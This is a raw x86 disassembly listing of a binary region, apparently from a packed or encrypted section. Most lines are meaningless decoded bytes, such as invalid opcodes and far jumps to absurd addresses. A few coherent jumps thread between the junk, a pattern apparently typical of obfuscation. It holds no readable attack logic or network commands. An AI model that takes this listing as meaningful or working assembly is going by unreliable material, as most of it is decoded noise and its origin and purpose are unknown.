  4071b2:	imul   ebp,DWORD PTR [esi-0x5069e7ae],0xd7e19961
  4071bc:	jl     0x4071cf
  4071be:	mov    ebx,0xa465f259
  4071c3:	les    esi,FWORD PTR [edi-0x343e7fa1]
  4071c9:	neg    DWORD PTR [esi+0x1ce88b8f]
  4071cf:	adc    DWORD PTR [ecx],edx
  4071d1:	xor    ebp,ebp
  4071d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071d4:	dec    esi
  4071d5:	cs leave 
  4071d7:	xchg   esi,eax
  4071d8:	cli    
  4071d9:	push   ebp
  4071da:	and    al,0xac
  4071dc:	(bad)
  4071e0:	shl    DWORD PTR [ebx],0x80
  4071e3:	pop    ebx
  4071e4:	jne    0x407265
  4071e6:	mov    dl,BYTE PTR [edi+0x46fed14]
  4071ec:	pop    eax
  4071ed:	push   edx
  4071ee:	push   ebx
  4071ef:	push   edx
  4071f0:	js     0x4071ce
  4071f2:	in     eax,dx
  4071f3:	sti    
  4071f4:	sub    ch,dh
  4071f6:	add    eax,0xdc5e5b86
  4071fb:	mov    ch,0x2a
  4071fd:	call   0xce1e000e
  407202:	imul   eax,DWORD PTR [ecx],0x7958147e
  407208:	and    al,0x98
  40720a:	or     DWORD PTR [eax-0x2e],ebp
  40720d:	jb     0x4071ec
  40720f:	sbb    al,0x49
  407211:	mov    bh,0x27
  407213:	nop
  407214:	aad    0xeb
  407216:	xchg   BYTE PTR [edi+ebx*8],bl
  407219:	push   ebp
  40721a:	inc    ebp
  40721b:	scas   al,BYTE PTR es:[edi]
  40721c:	mov    bl,BYTE PTR [edi-0x304e7150]
  407222:	inc    edx
  407223:	pop    es
  407224:	xchg   ebp,eax
  407225:	out    0x76,al
  407227:	mov    ?,WORD PTR [ebp+0x32]
  40722a:	inc    ecx
  40722b:	inc    esi
  40722c:	aad    0x96
  40722e:	in     al,dx
  40722f:	(bad)  
  407230:	fcomp  DWORD PTR [ebp-0xa]
  407233:	jne    0x407241
  407235:	scas   al,BYTE PTR es:[edi]
  407236:	mov    DWORD PTR [ebp+0x719bd55a],eax
  40723c:	add    DWORD PTR [ebx-0x3216ab40],ebp
  407242:	aas    
  407243:	pop    edi
  407244:	xor    ah,dl
  407246:	ror    DWORD PTR [eax+0x5d],0xa5
  40724a:	repz inc edi
  40724c:	inc    edx
  40724d:	push   0xfffffff4
  40724f:	sbb    edx,DWORD PTR [edx+0x3e]
  407252:	cmp    edx,edx
  407254:	pop    ecx
  407255:	fimul  DWORD PTR [eax+eiz*4-0x54e540b9]
  40725c:	fwait
  40725d:	nop
  40725e:	dec    ebp
  40725f:	fld    QWORD PTR [eax]
  407261:	mov    DWORD PTR [eax],ebp
  407263:	and    eax,0x1f70c3f8
  407268:	dec    edx
  407269:	clc    
  40726a:	mov    ecx,0x62d676cf
  40726f:	int    0xd4
  407271:	jl     0x407222
  407273:	adc    eax,0x4e775f1d
  407278:	sbb    eax,0x31e9572c
  40727d:	xchg   esi,edx
  40727f:	and    DWORD PTR [ebp+0xc],edx
  407282:	mov    al,ds:0xa5bfa6a9
  407287:	stos   BYTE PTR es:[edi],al
  407288:	sbb    BYTE PTR [ebx-0x349791c5],0xe5
  40728f:	jo     0x407300
  407291:	jecxz  0x407278
  407293:	push   esp
  407294:	ss mov bh,0x0
  407297:	jmp    0x40722e
  407299:	push   ebp
  40729a:	int3   
  40729b:	xchg   edx,eax
  40729c:	std    
  40729d:	das    
  40729e:	push   0xe7b2c0cd
  4072a3:	call   0xdc6e98b8
  4072a8:	jns    0x407313
  4072aa:	push   ecx
  4072ab:	shl    DWORD PTR [ebx+0x6476f7b3],0x81
  4072b2:	(bad)  
  4072b3:	sbb    dl,cl
  4072b5:	scas   al,BYTE PTR es:[edi]
  4072b6:	test   al,0x87
  4072b8:	mov    DWORD PTR [ebp+0x24],0xb437d10f
  4072bf:	call   0x58e87851
  4072c4:	dec    esi
  4072c5:	ds popf 
  4072c7:	pop    ss
  4072c8:	or     cl,BYTE PTR gs:[ebx]
  4072cb:	pop    edx
  4072cc:	pusha  
  4072cd:	cmp    al,0xd7
  4072cf:	mul    BYTE PTR [ebx]
  4072d1:	pop    es
  4072d2:	jle    0x40726e
  4072d4:	loope  0x4072e9
  4072d6:	lods   al,BYTE PTR ds:[esi]
  4072d7:	in     eax,0xc1
  4072d9:	jmp    0xe651fd1
  4072de:	les    esp,FWORD PTR [eax+0x2d]
  4072e1:	jp     0x4072fd
  4072e3:	in     al,0x83
  4072e5:	leave  
  4072e6:	sub    edx,edi
  4072e8:	xchg   si,di
  4072eb:	mov    DWORD PTR ds:0xee0e0dd7,eax
  4072f1:	inc    ecx
  4072f2:	test   eax,0xda9aa9b
  4072f7:	push   ebx
  4072f8:	xor    esi,ecx
  4072fa:	rcr    BYTE PTR [edi+0x4264f952],0xa4
  407301:	cmp    eax,DWORD PTR [ebx-0x51]
  407304:	gs mov al,dh
  407307:	xchg   esp,eax
  407308:	popf   
  407309:	adc    BYTE PTR [ebp+0x421e9a7],dh
  40730f:	das    
  407310:	dec    ecx
  407311:	or     edi,DWORD PTR [eax+0x458b6828]
  407317:	clc    
  407318:	and    ecx,0x67ef
  40731e:	mov    ecx,0x7510856
  407323:	push   esi
  407324:	mov    esi,DWORD PTR ds:0x430646
  40732a:	sub    DWORD PTR ds:0x43059a,esi
  407330:	xor    eax,ecx
  407332:	mov    esi,0x32729d
  407337:	sub    DWORD PTR ds:0x42e862,0x4305aa
  407341:	add    eax,esi
  407343:	jmp    0x4074db
  407348:	mov    dl,BYTE PTR [ebp-0x1]
  40734b:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  40734f:	mov    DWORD PTR ds:0x4305b6,0x7329
  407359:	inc    eax
  40735a:	jmp    0x4074db
  40735f:	mov    WORD PTR [esi],cs
  407361:	jbe    0x407315
  407363:	pushf  
  407364:	pop    edx
  407365:	dec    esp
  407366:	fsub   DWORD PTR [edi-0x14fddca4]
  40736c:	or     al,0x53
  40736e:	jle    0x407379
  407370:	iret   
  407371:	jle    0x4073f1
  407373:	sar    BYTE PTR [edi+0x7e],cl
  407376:	jle    0x407367
  407378:	dec    esp
  407379:	xchg   esp,eax
  40737a:	jo     0x4073ca
  40737c:	sub    ebp,esp
  40737e:	jp     0x4073fe
  407380:	xchg   esi,eax
  407381:	test   DWORD PTR [ebx],ebp
  407383:	push   es
  407384:	or     eax,0x96163066
  407389:	push   edx
  40738a:	gs mov esp,0xf149e759
  407390:	pop    edx
  407391:	inc    eax
  407392:	mov    eax,0x60684898
  407397:	not    DWORD PTR [edi]
  407399:	aaa    
  40739a:	stc    
  40739b:	mov    ds:0x1eb4e414,eax
  4073a0:	mov    bl,0x3
  4073a2:	pop    eax
  4073a3:	mov    ebx,0xe0204f42
  4073a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073a9:	adc    ebp,DWORD PTR [ecx-0x11]
  4073ac:	sub    eax,DWORD PTR [eax]
  4073ae:	sti    
  4073af:	in     eax,dx
  4073b0:	xlat   BYTE PTR ds:[ebx]
  4073b1:	add    al,0x48
  4073b3:	leave  
  4073b4:	rol    DWORD PTR [esi+0x52fd73e0],0x97
  4073bb:	push   0x49b1b776
  4073c0:	adc    DWORD PTR [ebp-0x181fe99f],esp
  4073c6:	scas   eax,DWORD PTR es:[edi]
  4073c7:	dec    ecx
  4073c8:	lock sbb BYTE PTR [edi],bh
  4073cb:	xchg   DWORD PTR [esi+0x5f],esp
  4073ce:	push   ebx
  4073cf:	lock jae 0x4073fa
  4073d2:	ins    BYTE PTR es:[edi],dx
  4073d3:	popa   
  4073d4:	push   esi
  4073d5:	ds inc ecx
  4073d7:	jae    0x407426
  4073d9:	bound  esi,QWORD PTR [esi-0x46]
  4073dc:	adc    al,0x95
  4073de:	xchg   ebx,eax
  4073df:	dec    ecx
  4073e0:	rcr    BYTE PTR [ecx],1
  4073e2:	xchg   DWORD PTR [esi-0x59c3344],edx
  4073e8:	inc    ebp
  4073e9:	inc    esp
  4073ea:	xlat   BYTE PTR ds:[ebx]
  4073eb:	sbb    ch,ah
  4073ed:	lods   eax,DWORD PTR ds:[esi]
  4073ee:	lods   eax,DWORD PTR ds:[esi]
  4073ef:	mov    cs:0x16cc2c12,al
  4073f5:	jo     0x407411
  4073f7:	xlat   BYTE PTR ds:[ebx]
  4073f8:	jb     0x40740e
  4073fa:	fdivr  QWORD PTR [edi-0x72109267]
  407400:	sub    ebx,DWORD PTR ds:0xfef6376a
  407406:	xchg   ecx,eax
  407407:	pop    ebx
  407408:	dec    DWORD PTR [edi+0x45c8ef9f]
  40740e:	mov    esp,0xa1907cc8
  407413:	sub    ah,BYTE PTR [ebp+ebx*1+0x556b36f9]
  40741a:	int3   
  40741b:	sbb    eax,0x831b517a
  407420:	inc    esi
  407421:	stos   BYTE PTR es:[edi],al
  407422:	add    ebx,edi
  407424:	push   edi
  407425:	xchg   esp,eax
  407426:	jg     0x4073e2
  407428:	add    bl,dl
  40742a:	test   al,0xf5
  40742c:	test   al,0xd1
  40742e:	call   0xa12f:0xd86f37a2
  407435:	adc    esi,DWORD PTR [ecx+0x4c]
  407438:	xor    DWORD PTR [edx+0x4c],0xce3de784
  40743f:	dec    ebp
  407440:	iret   
  407441:	pop    ss
  407442:	push   es
  407443:	std    
  407444:	ins    DWORD PTR es:[edi],dx
  407445:	out    0xcf,eax
  407447:	fisub  WORD PTR [ecx+0xb]
  40744a:	(bad)  
  40744b:	aam    0x7e
  40744d:	and    edi,esp
  40744f:	lock popa 
  407451:	or     al,BYTE PTR [edi-0x68dcd0bb]
  407457:	rcl    DWORD PTR [esp+edi*1+0x648d300d],0x78
  40745f:	mov    ebp,DWORD PTR [edi+esi*8-0xd]
  407463:	lods   eax,DWORD PTR ds:[esi]
  407464:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407465:	das    
  407466:	outs   dx,DWORD PTR ds:[esi]
  407467:	ret    0x88b2
  40746a:	imul   ebp,DWORD PTR [ecx+0x28],0x3c7f9ccc
  407471:	xor    edi,DWORD PTR [edx-0x13d932c1]
  407477:	pop    es
  407478:	and    ebp,DWORD PTR [esp+ebx*4]
  40747b:	jae    0x407428
  40747d:	cmc    
  40747e:	retf   0x1997
  407481:	in     eax,0x2e
  407483:	(bad)  
  407484:	out    0x81,al
  407486:	sub    cl,dl
  407488:	pushf  
  407489:	out    dx,al
  40748a:	fdiv   DWORD PTR [edi+0x68215bbb]
  407490:	jmp    0x41983301
  407495:	call   FWORD PTR [esp+esi*2+0x19f192fc]
  40749c:	and    al,0xfa
  40749e:	xchg   edi,eax
  40749f:	int3   
  4074a0:	inc    edx
  4074a1:	push   0xffffffc6
  4074a3:	test   al,0x2a
  4074a5:	jmp    FWORD PTR [ecx+0xa]
  4074a8:	mov    dl,0xcb
  4074aa:	sbb    esp,esp
  4074ac:	hlt    
  4074ad:	sub    edx,ebp
  4074af:	sub    dh,BYTE PTR [eax-0x3e685bc3]
  4074b5:	cmp    ecx,ecx
  4074b7:	cld    
  4074b8:	(bad)  
  4074b9:	xchg   edi,eax
  4074ba:	aad    0x36
  4074bc:	scas   al,BYTE PTR es:[edi]
  4074bd:	repnz inc ebx
  4074bf:	jno    0x407478
  4074c1:	xchg   ebx,eax
  4074c2:	jmp    0x7464:0x16dd995d
  4074c9:	dec    edi
  4074ca:	or     BYTE PTR [ebx+eiz*4-0x6663b26f],dh
  4074d1:	fstp   TBYTE PTR [ebp+0x3]
  4074d4:	pop    es
  4074d5:	fldcw  WORD PTR [ecx-0x3596bb9e]
  4074db:	cmp    eax,0x40
  4074de:	jb     0x407348
  4074e4:	mov    edx,DWORD PTR [ebp-0x8]
  4074e7:	mov    eax,DWORD PTR [ebp-0xc]
  4074ea:	xor    edx,ecx
  4074ec:	add    edx,esi
  4074ee:	cmp    edx,eax
  4074f0:	je     0x407cbb
  4074f6:	push   ebx
  4074f7:	push   edi
  4074f8:	jmp    0x407679
  4074fd:	ins    BYTE PTR es:[edi],dx
  4074fe:	lds    edx,FWORD PTR [edx]
  407500:	cmp    BYTE PTR [ebx-0x1002839b],0xf2
  407507:	xchg   dl,dh
  407509:	add    al,0xb7
  40750b:	inc    ebp
  40750c:	pop    es
  40750d:	in     eax,dx
  40750e:	sar    BYTE PTR [esi+0x7e],0xd2
  407512:	jg     0x407592
  407514:	jle    0x4074f5
  407516:	ins    BYTE PTR es:[edi],dx
  407517:	and    ebp,esp
  407519:	mov    eax,ds:0xb4811c7d
  40751e:	out    dx,eax
  40751f:	scas   al,BYTE PTR es:[edi]
  407520:	loopne 0x4074cd
  407522:	sub    BYTE PTR [ebp+0x67],ch
  407525:	in     al,0xc7
  407527:	mov    edi,0x24237d04
  40752c:	mov    ebp,0xa4be8690
  407531:	push   eax
  407533:	ja     0x40751c
  407535:	push   ebx
  407536:	add    eax,0x271e243b
  40753b:	or     eax,0xb4e57f59
  407540:	mov    edi,0xe0e93e95
  407545:	and    BYTE PTR [ebx-0x27],dh
  407548:	je     0x4074ee
  40754a:	in     al,dx
  40754b:	shr    BYTE PTR [edx],1
  40754d:	mov    ebx,0x94906f09
  407552:	ja     0x4075c9
  407554:	xchg   ebx,eax
  407555:	ror    BYTE PTR [ebx+0x72],0x55
  407559:	pop    esi
  40755a:	and    edi,edx
  40755c:	xor    esp,DWORD PTR [eax]
  40755e:	sub    BYTE PTR [ebp+0x4b],0x7b
  407562:	call   0xe4d9a7f2
  407567:	ret    0xe9cb
  40756a:	stc    
  40756b:	pop    esi
  40756c:	or     ah,BYTE PTR [esi]
  40756e:	jae    0x407503
  407570:	inc    edi
  407571:	(bad)  
  407572:	mov    eax,ds:0x623d7a0d
  407577:	inc    edi
  407578:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407579:	aas    
  40757a:	xchg   edx,eax
  40757b:	push   es
  40757c:	outs   dx,BYTE PTR ds:[esi]
  40757d:	sbb    eax,0x6b084cc7
  407582:	xchg   DWORD PTR [edi-0x28],esi
  407585:	int    0xd6
  407587:	fidiv  WORD PTR [edi+0x294d4a75]
  40758d:	inc    ebx
  40758e:	test   eax,0xa4093337
  407593:	into   
  407594:	addr16 es cli 
  407597:	dec    edx
  407598:	dec    ecx
  407599:	and    edi,esi
  40759b:	aas    
  40759c:	pop    ss
  40759d:	cmp    eax,ecx
  40759f:	cli    
  4075a0:	xchg   esi,eax
  4075a1:	jne    0x40758c
  4075a3:	cmp    bl,BYTE PTR [eax-0x6db6915]
  4075a9:	jecxz  0x407612
  4075ab:	cmc    
  4075ac:	adc    bh,BYTE PTR [edi]
  4075ae:	neg    WORD PTR [esi]
  4075b1:	sbb    al,0x45
  4075b3:	aad    0xdc
  4075b5:	jp     0x407593
  4075b7:	mov    esi,0x21daf37c
  4075bc:	leave  
  4075bd:	and    esp,ebx
  4075bf:	pop    esp
  4075c0:	inc    esi
  4075c1:	inc    esi
  4075c2:	and    edx,DWORD PTR fs:[eax+0x61e037db]
  4075c9:	lahf   
  4075ca:	push   edx
  4075cb:	in     eax,0x8b
  4075cd:	push   ds
  4075ce:	mov    ecx,0x1486c86d
  4075d3:	inc    edi
  4075d4:	call   0xe0eaffb8
  4075d9:	xor    BYTE PTR [ecx+0x2490a2d9],bh
  4075df:	pop    edx
  4075e0:	bound  ebp,QWORD PTR [edi]
  4075e2:	jmp    0x8dd1:0x3f82b876
  4075e9:	mov    DWORD PTR ss:[edi],edx
  4075ec:	fsubr  DWORD PTR [esi+0x4ab127b7]
  4075f2:	fwait
  4075f3:	xchg   edx,eax
  4075f4:	mov    ah,0xfb
  4075f6:	fdivr  QWORD PTR ds:0x5e6cda79
  4075fc:	les    ecx,FWORD PTR [edi+0xb651d12]
  407602:	and    al,0x8
  407604:	mov    dl,0xa3
  407606:	out    dx,eax
  407607:	jecxz  0x4075b1
  407609:	push   0xf1ec918b
  40760e:	sbb    esp,ecx
  407610:	out    0xfe,al
  407612:	stos   DWORD PTR es:[edi],eax
  407613:	in     eax,0xd5
  407615:	xor    BYTE PTR [edx],dl
  407617:	aaa    
  407618:	js     0x4075bb
  40761a:	into   
  40761b:	faddp  st(1),st
  40761d:	cld    
  40761e:	repnz test al,0x43
  407621:	inc    DWORD PTR [ecx]
  407623:	in     al,dx
  407624:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407625:	pop    ecx
  407626:	xchg   ecx,eax
  407627:	sahf   
  407628:	out    0x22,eax
  40762a:	cld    
  40762b:	sub    eax,0x6364f799
  407630:	mov    ah,0x57
  407632:	jp     0x40769b
  407634:	shr    BYTE PTR [ecx+0x47aa9901],1
  40763a:	ss dec ecx
  40763c:	mov    esi,0x265ba241
  407641:	or     BYTE PTR [esi+0x17],0xe5
  407645:	pop    ecx
  407646:	fwait
  407647:	xchg   BYTE PTR [edi+0x368a14fb],al
  40764d:	fild   WORD PTR [edi]
  40764f:	leave  
  407650:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407651:	pop    esi
  407652:	sub    eax,0xe903684b
  407657:	mov    eax,ds:0xda14102d
  40765c:	push   ebx
  40765d:	xchg   dl,dl
  40765f:	sub    DWORD PTR [ebp-0xec4da6a],ecx
  407665:	popf   
  407666:	bound  eax,QWORD PTR [edx-0x54370fa9]
  40766c:	cmp    BYTE PTR [esi],bh
  40766e:	cmc    
  40766f:	mov    ecx,DWORD PTR [eax-0x2ec7bd5f]
  407675:	jle    0x407653
  407677:	in     eax,0xe
  407679:	mov    edi,DWORD PTR [ebp+0x8]
  40767c:	jmp    0x4077fd
  407681:	jae    0x40766e
  407683:	cmp    al,ah
  407685:	cli    
  407686:	vpaddw ymm3,ymm2,YMMWORD PTR [eax+eax*1]
  40768b:	inc    DWORD PTR [ecx]
  40768d:	pop    ebx
  40768e:	in     eax,0x9e
  407690:	cmp    DWORD PTR [ecx-0x3f],eax
  407693:	jle    0x407713
  407695:	sar    BYTE PTR [edi+0x7e],cl
  407698:	jle    0x40766f
  40769a:	in     al,0xb6
  40769c:	cmp    al,0x17
  40769e:	scas   al,BYTE PTR es:[edi]
  40769f:	sar    DWORD PTR [edi],0x1c
  4076a2:	jo     0x4076d4
  4076a4:	mov    esp,0xdc3e8459
  4076a9:	ficomp DWORD PTR [ebx]
  4076ab:	jg     0x4076bd
  4076ad:	mov    eax,ds:0x9caab457
  4076b2:	adc    al,0x9f
  4076b4:	mov    ds:0x466aa278,eax
  4076b9:	arpl   sp,dx
  4076bb:	jp     0x40771e
  4076bd:	aas    
  4076be:	(bad)  
  4076bf:	cmp    BYTE PTR [edx],0xae
  4076c2:	popa   
  4076c3:	xchg   ecx,eax
  4076c4:	pop    edx
  4076c5:	add    DWORD PTR [edx+0x22],ecx
  4076c8:	dec    ecx
  4076c9:	push   0x7f9d13f3
  4076ce:	lahf   
  4076cf:	inc    ebx
  4076d0:	jmp    0xee2b:0xcc8d820d
  4076d7:	jg     0x4076b2
  4076d9:	ins    DWORD PTR es:[edi],dx
  4076da:	pop    ebp
  4076db:	test   al,0xd2
  4076dd:	jg     0x40769f
  4076df:	dec    edx
  4076e0:	shr    DWORD PTR [edx+0x43588cb9],0x6c
  4076e7:	push   ds
  4076e8:	jae    0x40775d
  4076ea:	mov    bh,0x30
  4076ec:	jns    0x4076d2
  4076ee:	sub    BYTE PTR [eax-0x7b],ch
  4076f1:	movzx  edx,WORD PTR [eax+eax*2-0x69]
  4076f6:	imul   esp,DWORD PTR [eax*1+0x3088dfd9],0xebf8ef05
  407701:	sub    ebx,ebp
  407703:	out    0x16,eax
  407705:	pop    ebx
  407706:	xor    al,0x91
  407708:	jns    0x40772c
  40770a:	loope  0x4076f5
  40770c:	add    bl,BYTE PTR [ebp-0x5a]
  40770f:	int    0xa6
  407711:	sti    
  407712:	hlt    
  407713:	jp     0x4076dc
  407715:	(bad)
  40771a:	imul   esi,DWORD PTR [esi+0x73],0xe
  40771e:	add    al,0xc4
  407720:	push   0xfffffff2
  407722:	sub    bh,BYTE PTR [eax-0x4a]
  407725:	push   edx
  407726:	inc    edx
  407727:	loope  0x407722
  407729:	test   eax,0xc46f8e1e
  40772e:	cmp    eax,0x593fa2bd
  407733:	popf   
  407734:	rcr    DWORD PTR [ebp+0x1b6500a6],1
  40773a:	cmp    cl,BYTE PTR [ecx+ebx*4]
  40773d:	xor    ebx,DWORD PTR [eax+edx*8-0x40f4c07]
  407744:	mov    dh,0xbb
  407746:	pop    edi
  407747:	std    
  407748:	adc    eax,0x316e1bc3
  40774d:	xchg   ebx,eax
  40774e:	jne    0x407768
  407750:	xlat   BYTE PTR gs:[ebx]
  407752:	jp     0x407783
  407754:	jmp    0x407791
  407756:	in     eax,dx
  407757:	and    BYTE PTR [esi],bh
  407759:	xor    eax,0xd1ce6b6f
  40775e:	jecxz  0x407725
  407760:	xlat   BYTE PTR ds:[ebx]
  407761:	inc    ebx
  407762:	lahf   
  407763:	pop    edi
  407764:	mov    bl,0x41
  407766:	jno    0x4077a5
  407768:	outs   dx,DWORD PTR ds:[esi]
  407769:	jmp    0x4077c3
  40776b:	xchg   edi,eax
  40776c:	lahf   
  40776d:	leave  
  40776e:	push   ds
  40776f:	adc    eax,ecx
  407771:	and    bh,dh
  407773:	out    dx,eax
  407774:	jb     0x40774a
  407776:	pusha  
  407777:	lods   eax,DWORD PTR ds:[esi]
  407778:	lock jle 0x4077bd
  40777b:	js     0x4077f1
  40777d:	sub    eax,0xbdc147dd
  407782:	pop    ecx
  407783:	(bad)  
  407784:	pop    ds
  407785:	add    DWORD PTR [edx],ebx
  407787:	aad    0xb5
  407789:	fcomp  QWORD PTR ss:[esp+eiz*4+0xf]
  40778e:	xor    al,0xfd
  407790:	test   eax,0xa1ef492d
  407795:	push   ds
  407796:	pop    ebx
  407797:	mov    al,BYTE PTR [ebx-0x53]
  40779a:	xor    DWORD PTR [esi+0x68],eax
  40779d:	pop    ds
  40779e:	dec    ebp
  40779f:	adc    ah,BYTE PTR [edi-0x2b3c2fa6]
  4077a5:	test   BYTE PTR [eax+eax*1-0x3a40566f],ah
  4077ac:	ror    DWORD PTR [edx+0x614fa094],cl
  4077b2:	adc    dl,BYTE PTR [ebx-0x46]
  4077b5:	sub    eax,0x16c5b408
  4077ba:	shr    ah,cl
  4077bc:	dec    ebx
  4077bd:	imul   ebp,DWORD PTR [eax+0x40],0x4c
  4077c1:	or     ebx,DWORD PTR [edx+ebp*8+0x3d]
  4077c5:	adc    esi,DWORD PTR [edx-0x696442df]
  4077cb:	mov    BYTE PTR [edx],al
  4077cd:	ss push esi
  4077cf:	das    
  4077d0:	jno    0x4077bb
  4077d2:	data16 int3 
  4077d4:	jmp    0xad60:0x7c7f955a
  4077db:	cdq    
  4077dc:	xor    dh,bh
  4077de:	and    eax,0x48408996
  4077e3:	scas   eax,DWORD PTR es:[edi]
  4077e4:	test   DWORD PTR [eax+0x74],0x6b048147
  4077eb:	xor    edi,0xffffffa5
  4077ee:	push   esp
  4077ef:	sub    eax,0x8ad2ca3b
  4077f4:	in     eax,dx
  4077f5:	or     eax,0x511ae66e
  4077fa:	punpckhdq mm6,QWORD PTR [eax+0x8a40b8]
  407801:	add    BYTE PTR [esi+0x33],ah
  407804:	inc    esp
  407805:	xchg   edi,eax
  407806:	add    bh,BYTE PTR [edi+0x3b06]
  40780c:	add    ax,di
  40780f:	jmp    0x407990
  407814:	push   ebp
  407815:	fsub   DWORD PTR [edx+0x557cbb2e]
  40781b:	pop    ebp
  40781c:	xchg   ecx,esp
  40781e:	push   0xd
  407820:	test   DWORD PTR [ecx-0x3cdab727],eax
  407826:	jle    0x4078a6
  407828:	sar    BYTE PTR [edi+0x7e],cl
  40782b:	jle    0x40781a
  40782d:	addr16 js 0x407817
  407830:	mov    esi,0xbcc0ec35
  407835:	scas   eax,DWORD PTR es:[edi]
  407836:	fbstp  TBYTE PTR [edi]
  407838:	xor    al,0xa3
  40783a:	jmp    0xdb87:0x3f216544
  407841:	out    0x9d,al
  407843:	cwde   
  407844:	mov    edx,0x6feafab6
  407849:	in     eax,dx
  40784a:	in     eax,dx
  40784b:	mov    bh,0x17
  40784d:	pop    edi
  40784e:	mov    eax,ds:0x3006c383
  407853:	sbb    dh,BYTE PTR [ebx]
  407855:	(bad)  
  407856:	mov    esi,0xb7a01f48
  40785b:	repz push esi
  40785d:	stos   DWORD PTR es:[edi],eax
  40785e:	lea    esp,[ebp+0x46]
  407861:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  407863:	stc    
  407864:	ror    esp,cl
  407866:	inc    edi
  407867:	(bad)  
  407868:	adc    BYTE PTR [esp+edi*1],bl
  40786b:	enter  0xafd4,0xd8
  40786f:	jnp    0x407832
  407871:	jne    0x4078d4
  407873:	or     DWORD PTR [ebx+0x2e85d792],edi
  407879:	push   0xc7ad1d5e
  40787e:	add    dh,BYTE PTR [ecx]
  407880:	push   0xffffff8c
  407882:	dec    edi
  407883:	push   cs
  407884:	(bad)  
  407885:	mov    esi,0xdc7f8f63
  40788a:	mov    BYTE PTR [ebx-0x67],0xea
  40788e:	in     al,0x97
  407890:	xchg   ecx,eax
  407891:	push   ss
  407892:	iret   
  407893:	sbb    BYTE PTR [ecx+0x2b64f2ab],al
  407899:	mov    ebx,0xf5dcfb4a
  40789e:	(bad)  
  40789f:	sahf   
  4078a0:	test   DWORD PTR [edi-0x1ea3200e],eax
  4078a6:	repnz cwde 
  4078a8:	push   cs
  4078a9:	sub    al,BYTE PTR [eax-0x7acdfdea]
  4078af:	sub    eax,0xa0684e79
  4078b4:	(bad)  
  4078b6:	sbb    al,0x44
  4078b8:	push   esp
  4078b9:	in     al,dx
  4078ba:	rol    BYTE PTR [ebx+0x1796d7f8],1
  4078c0:	xchg   edx,eax
  4078c1:	imul   esi,DWORD PTR [ebp-0x42cad017],0x69
  4078c8:	inc    edx
  4078c9:	test   al,0xa4
  4078cb:	adc    ecx,DWORD PTR [edx-0x5]
  4078ce:	loopne 0x40790c
  4078d0:	std    
  4078d1:	aam    0xf
  4078d3:	call   0xec0d:0x9ffa520b
  4078da:	idiv   ebp
  4078dc:	mov    WORD PTR [edx],ds
  4078de:	adc    BYTE PTR [ebp+0x7fd72077],dh
  4078e4:	cdq    
  4078e5:	test   ebp,ecx
  4078e7:	sti    
  4078e8:	sub    BYTE PTR [edi+0x2b],bh
  4078eb:	mov    bl,0xe7
  4078ed:	pop    ebx
  4078ee:	or     esi,esp
  4078f0:	das    
  4078f1:	inc    edx
  4078f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078f3:	test   al,0xc1
  4078f5:	xor    BYTE PTR [eax+0x12],ah
  4078f8:	mov    ebx,DWORD PTR [edi+0x4b]
  4078fb:	in     al,0x57
  4078fd:	pop    esp
  4078fe:	clc    
  4078ff:	and    dl,al
  407901:	call   0x1262:0x7a38f914
  407908:	in     al,dx
  407909:	repz scas al,BYTE PTR es:[edi]
  40790b:	aad    0xb2
  40790d:	and    BYTE PTR [esp+edi*4-0x30350c57],0x1a
  407915:	mov    ecx,0xaf4e0c85
  40791a:	test   al,0x99
  40791c:	daa    
  40791d:	sub    al,0x5f
  40791f:	sub    esp,DWORD PTR [eax+0x3e]
  407922:	mov    dl,0x33
  407924:	jle    0x407902
  407926:	xlat   BYTE PTR ds:[ebx]
  407927:	xor    eax,0xfa036b4c
  40792c:	sbb    DWORD PTR [ebx+0x7adcb302],esi
  407932:	sub    esi,edi
  407934:	pop    edi
  407935:	add    eax,0x6d5b7c03
  40793a:	lods   eax,DWORD PTR ds:[esi]
  40793b:	lahf   
  40793c:	sbb    ebx,DWORD PTR [edi-0x618cb041]
  407942:	add    DWORD PTR [edi+0x26],edi
  407945:	jns    0x407921
  407947:	cmp    DWORD PTR [eax+0x22],ebx
  40794a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40794b:	ins    BYTE PTR es:[edi],dx
  40794c:	stc    
  40794d:	mov    cl,0xf
  40794f:	sbb    al,ah
  407951:	ds je  0x407994
  407954:	push   0xffffffa7
  407956:	int3   
  407957:	mov    BYTE PTR [ecx],dh
  407959:	jl     0x40790a
  40795b:	push   ss
  40795c:	cmc    
  40795d:	pop    es
  40795e:	xchg   edx,eax
  40795f:	popa   
  407960:	push   ecx
  407961:	dec    edi
  407962:	das    
  407963:	repz sub eax,0xdf2b5d6d
  407969:	ins    BYTE PTR es:[edi],dx
  40796a:	outs   dx,DWORD PTR ds:[esi]
  40796b:	mov    dh,0x53
  40796d:	xchg   edi,eax
  40796e:	aaa    
  40796f:	lods   eax,DWORD PTR ds:[esi]
  407970:	stc    
  407971:	adc    esi,DWORD PTR [esi-0x75]
  407974:	(bad)
  407977:	jbe    0x407989
  407979:	xlat   BYTE PTR ds:[ebx]
  40797a:	mov    bh,0xa9
  40797c:	inc    esp
  40797d:	xor    eax,0xb677c3ad
  407982:	lods   al,BYTE PTR ds:[esi]
  407983:	mov    ds:0xfdd658ec,al
  407988:	lods   al,BYTE PTR ds:[esi]
  407989:	xlat   BYTE PTR ds:[ebx]
  40798a:	mov    ebp,0x9ddfcebd
  40798f:	adc    ecx,DWORD PTR [edi]
  407991:	mov    bh,0xc0
  407993:	mov    DWORD PTR [ebp-0x14],eax
  407996:	jmp    0x407b17
  40799b:	xchg   ebx,eax
  40799c:	(bad)  
  40799d:	sbb    ebp,edi
  40799f:	cmp    edi,DWORD PTR [ebx+0x6b]
  4079a2:	inc    edx
  4079a3:	push   sp
  4079a5:	cwde   
  4079a6:	pop    edi
  4079a7:	mov    dh,0x7c
  4079a9:	std    
  4079aa:	push   0x7e7ec499
  4079af:	sar    BYTE PTR [edi+0x7e],cl
  4079b2:	jle    0x4079d6
  4079b4:	and    BYTE PTR [esi+ecx*8],dh
  4079b7:	mov    edi,0x63570271
